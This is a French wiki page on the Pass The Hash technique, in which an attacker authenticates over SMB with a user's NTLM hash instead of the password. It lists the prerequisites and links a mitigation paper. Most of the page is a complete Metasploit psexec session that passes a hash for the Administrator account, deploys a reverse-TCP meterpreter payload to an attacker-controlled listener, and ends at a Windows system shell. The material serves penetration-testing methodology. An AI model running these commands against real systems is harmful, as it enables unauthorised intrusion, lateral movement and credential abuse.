---
title: Pass The Hash
permalink: /Pass_The_Hash/
---

La méthode **Pass The Hash** consiste à utiliser le hash NTLM d'un utilisateur pour s'authentifier auprès d'un service. Cette attaque permet de s'authentifier sans connaître le mot de passe en clair. Elle est notamment très utile dans les phases de déplcament latéral.

Utilisation
-----------

Il est nécessaire d'avoir récupéré les informations suivantes:

-   Le nom de l'utilisateur.
-   Le domaine auquel il appartient (sauf s'il s'agit d'un utilisateur local).
-   Le [hash NTLM](/hash_NTLM "wikilink") du mot de passe de l'utilisateur.

Avec ces éléments il est alors possible d'executer des commandes sur différents serveurs via le protocole [SMB](/SMB "wikilink").

Mitigation
----------

Voir <https://download.microsoft.com/download/7/7/a/77abc5bd-8320-41af-863c-6ecfb10cb4b9/mitigating%20pass-the-hash%20(pth)%20attacks%20and%20other%20credential%20theft%20techniques_english.pdf>

PSEXEC
------

### Metasploit

Il est possible d'utiliser le module psexec de metasploit pour déployer un meterpreter[1]

``` bash
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(psexec) > set LHOST 192.168.57.133
LHOST => 192.168.57.133
msf exploit(psexec) > set LPORT 443
LPORT => 443
msf exploit(psexec) > set RHOST 192.168.57.131
RHOST => 192.168.57.131
msf exploit(psexec) > show options

Module options:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    192.168.57.131   yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPass                   no        The password for the specified username
   SMBUser  Administrator    yes       The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique: seh, thread, process
   LHOST     192.168.57.133   yes       The local address
   LPORT     443              yes       The local port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
SMBPass => e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
msf exploit(psexec) > exploit

[*] Connecting to the server...
[*] Started reverse handler
[*] Authenticating as user 'Administrator'...
[*] Uploading payload...
[*] Created \KoVCxCjx.exe...
[*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.57.131[\svcctl] ...
[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.57.131[\svcctl] ...
[*] Obtaining a service manager handle...
[*] Creating a new service (XKqtKinn - "MSSeYtOQydnRPWl")...
[*] Closing service handle...
[*] Opening service...
[*] Starting the service...
[*] Removing the service...
[*] Closing service handle...
[*] Deleting \KoVCxCjx.exe...
[*] Sending stage (719360 bytes)
[*] Meterpreter session 1 opened (192.168.57.133:443 -> 192.168.57.131:1045)

meterpreter > shell
Process 3680 created.
Channel 1 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32>
```

[Catégorie:Méthodologies](/Catégorie:Méthodologies "wikilink")

[1] [1](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/)